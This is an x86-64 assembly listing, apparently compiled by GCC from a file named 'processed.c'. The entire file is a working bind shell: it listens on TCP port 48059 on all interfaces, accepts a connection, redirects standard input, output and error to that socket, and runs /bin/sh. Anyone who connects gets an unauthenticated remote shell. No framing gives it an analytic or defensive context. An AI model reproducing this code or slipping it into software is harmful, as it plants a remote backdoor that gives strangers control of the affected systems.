	.file	"processed.c"
	.text
	.section	.rodata
.LC0:
	.string	"/bin/sh"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movl	$0, %edx
	movl	$1, %esi
	movl	$2, %edi
	call	socket
	movl	%eax, -4(%rbp)
	movl	$0, -44(%rbp)
	movw	$-17477, -46(%rbp)
	movw	$2, -48(%rbp)
	leaq	-48(%rbp), %rcx
	movl	-4(%rbp), %eax
	movl	$16, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	bind
	movl	-4(%rbp), %eax
	movl	$0, %esi
	movl	%eax, %edi
	call	listen
	movl	-4(%rbp), %eax
	movl	$0, %edx
	movl	$0, %esi
	movl	%eax, %edi
	call	accept
	movl	%eax, -8(%rbp)
	movl	-8(%rbp), %eax
	movl	$0, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	dup2
	movl	-8(%rbp), %eax
	movl	$1, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	dup2
	movl	-8(%rbp), %eax
	movl	$2, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	dup2
	movq	$.LC0, -32(%rbp)
	movq	$0, -24(%rbp)
	movq	-32(%rbp), %rax
	leaq	-32(%rbp), %rcx
	movl	$0, %edx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	execve
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE5:
	.size	main, .-main
	.ident	"GCC: (GNU) 7.3.1 20180712 (Red Hat 7.3.1-6)"
	.section	.note.GNU-stack,"",@progbits
